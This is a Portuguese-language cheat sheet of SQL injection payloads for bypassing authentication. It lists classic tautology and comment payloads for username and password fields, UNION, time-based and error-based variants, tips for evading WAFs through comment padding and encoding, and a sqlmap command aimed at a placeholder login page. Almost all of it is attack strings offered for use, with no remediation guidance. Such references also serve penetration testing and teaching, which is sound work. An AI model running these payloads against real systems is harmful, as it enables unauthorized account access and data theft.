# SQL Injection - Authentication Bypass Cheat Sheet

> Técnicas para **bypass de login** usando **SQL Injection** em campos de autenticação.

***

### 📍 Estrutura típica de uma query de autenticação vulnerável

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```

***

### 🔐 Payloads básicos de autenticação

| Tipo                  | Payload               |
| --------------------- | --------------------- |
| Clássico (OR 1=1)     | `' OR 1=1 --`         |
| Comentário inline     | `' OR 1=1 #`          |
| Igualdade booleana    | `' OR '1'='1' --`     |
| Ignora senha          | `' OR '' = '`         |
| Explora dupla negação | `' OR NOT '1'='2' --` |

***

### 🔍 Exemplos por campo

#### 🧑 Usuário (username)

```sql
admin' -- 
admin' #
admin'/*
```

#### 🔑 Senha (password)

```sql
' or 1=1-- 
' or '1'='1
```

***

### 📌 Payloads mais complexos

```sql
' or 1=1 limit 1 -- 
' or sleep(5) -- (testa time-based blind)
```

***

### 🧪 Testes úteis

| Objetivo               | Payload                                     |
| ---------------------- | ------------------------------------------- |
| Bypass com OR          | `' or 1=1--`                                |
| Testar erro            | `' OR 1=CONVERT(int, (SELECT @@version))--` |
| Comentário com hash    | `' OR 1=1#`                                 |
| Comentário com /\* \*/ | `' OR 1=1/*`                                |
| Condicional verdadeira | `' OR 'a'='a`                               |
| Condicional falsa      | `' AND 'a'='b`                              |

***

### 🔂 Variantes usando UNION ou subselects

```sql
' UNION SELECT 1, 'anotheruser', 'pass'-- 
```

***

### 🧼 Observações

* **`--`** é usado para comentar o restante da SQL query.
* **`#`** também funciona como comentário em MySQL.
* Pode ser necessário **escapar aspas** ou usar **diferentes formas de encoding**.
* Em alguns casos, você pode usar **`/**/`** entre palavras-chave para evadir WAFs.

***

### 🧠 Recomendações de uso

* Teste diferentes **tipos de comentários** (`--`, `#`, `/* */`)
* Teste diferentes **códigos de escape**, como `%27`, `\'`, `''`
* Verifique **respostas do servidor** para identificar SQLi (erro, delay, conteúdo alterado)

***

### 🧪 Dica extra: automatize com SQLMap

```bash
sqlmap -u "http://target/login.php" --data "username=admin&password=admin" --batch
```
